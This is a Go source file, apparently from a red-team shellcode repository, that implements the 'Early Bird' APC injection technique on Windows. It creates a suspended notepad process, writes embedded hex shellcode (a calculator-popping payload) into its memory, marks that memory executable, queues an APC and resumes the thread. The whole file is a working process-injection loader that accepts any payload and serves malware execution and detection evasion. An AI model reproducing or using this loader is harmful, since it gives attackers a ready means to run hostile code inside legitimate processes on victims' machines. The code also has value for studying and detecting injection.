//go:build windows
// +build windows

// CREDIT: https://raw.githubusercontent.com/Ne0nd0g/go-shellcode/master/cmd/EarlyBird/main.go
// Concept pulled from https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/

/*
	This program executes shellcode in a child process using the following steps:
		1. Create a child proccess in a suspended state with CreateProcessW
		2. Allocate RW memory in the child process with VirtualAllocEx
		3. Write shellcode to the child process with WriteProcessMemory
		4. Change the memory permissions to RX with VirtualProtectEx
		5. Add a UserAPC call that executes the shellcode to the child process with QueueUserAPC
		6. Resume the suspended program with ResumeThread function
*/

package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"os"
	"syscall"
	"unsafe"

	// Sub Repositories
	"golang.org/x/sys/windows"
)

func main() {
	verbose := flag.Bool("verbose", false, "Enable verbose output")
	debug := flag.Bool("debug", false, "Enable debug output")
	program := flag.String("program", "C:\\Windows\\System32\\notepad.exe", "The program to start and inject shellcode into")
	args := flag.String("args", "", "Program command line arguments")
	flag.Usage = func() {
		flag.PrintDefaults()
		os.Exit(0)
	}
	flag.Parse()

	// Pop Calc Shellcode (x64)
	shellcode, errShellcode := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}

	if *debug {
		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll...")
	}

	// Load DLLs and Procedures
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	if *debug {
		fmt.Println("[DEBUG]Loading supporting procedures...")
	}
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	QueueUserAPC := kernel32.NewProc("QueueUserAPC")

	// Create child proccess in suspended state
	/*
		BOOL CreateProcessW(
		LPCWSTR               lpApplicationName,
		LPWSTR                lpCommandLine,
		LPSECURITY_ATTRIBUTES lpProcessAttributes,
		LPSECURITY_ATTRIBUTES lpThreadAttributes,
		BOOL                  bInheritHandles,
		DWORD                 dwCreationFlags,
		LPVOID                lpEnvironment,
		LPCWSTR               lpCurrentDirectory,
		LPSTARTUPINFOW        lpStartupInfo,
		LPPROCESS_INFORMATION lpProcessInformation
		);
	*/

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling CreateProcess to start:\r\n\t%s %s...", *program, *args))
	}
	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	errCreateProcess := windows.CreateProcess(syscall.StringToUTF16Ptr(*program), syscall.StringToUTF16Ptr(*args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
	if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully created the %s process in PID %d", *program, procInfo.ProcessId))
	}

	// Allocate memory in child process
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualAllocEx on PID %d...", procInfo.ProcessId))
	}
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", procInfo.ProcessId))
	}
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Shellcode address: 0x%x", addr))
	}

	// Write shellcode into child process memory
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling WriteProcessMemory on PID %d...", procInfo.ProcessId))
	}
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully wrote %d shellcode bytes to PID %d", len(shellcode), procInfo.ProcessId))
	}

	// Change memory permissions to RX in child process where shellcode was written
	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualProtectEx on PID %d...", procInfo.ProcessId))
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully changed memory permissions to PAGE_EXECUTE_READ in PID %d", procInfo.ProcessId))
	}

	// QueueUserAPC
	if *debug {
		fmt.Println("[DEBUG]Calling QueueUserAPC")
	}

	ret, _, err := QueueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)
	if err != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling QueueUserAPC:\n%s", err.Error()))
	}
	if *debug {
		fmt.Printf("[DEBUG]The QueueUserAPC call returned %v\n", ret)
	}
	if *verbose {
		fmt.Printf("[-]Successfully queued a UserAPC on process ID %d\n", procInfo.ProcessId)
	}

	// Resume the child process
	if *debug {
		fmt.Println("[DEBUG]Calling ResumeThread...")
	}
	_, errResumeThread := windows.ResumeThread(procInfo.Thread)
	if errResumeThread != nil {
		log.Fatal(fmt.Sprintf("[!]Error calling ResumeThread:\r\n%s", errResumeThread.Error()))
	}
	if *verbose {
		fmt.Println("[+]Process resumed and shellcode executed")
	}

	// Close the handle to the child process
	if *debug {
		fmt.Println("[DEBUG]Calling CloseHandle on child process...")
	}
	errCloseProcHandle := windows.CloseHandle(procInfo.Process)
	if errCloseProcHandle != nil {
		log.Fatal(fmt.Sprintf("[!]Error closing the child process handle:\r\n\t%s", errCloseProcHandle.Error()))
	}

	// Close the hand to the child process thread
	if *debug {
		fmt.Println("[DEBUG]Calling CloseHandle on child process thread...")
	}
	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
	if errCloseThreadHandle != nil {
		log.Fatal(fmt.Sprintf("[!]Error closing the child process thread handle:\r\n\t%s", errCloseThreadHandle.Error()))
	}
}

// export GOOS=windows GOARCH=amd64;go build -o EarlyBird.exe ./EarlyBird.go
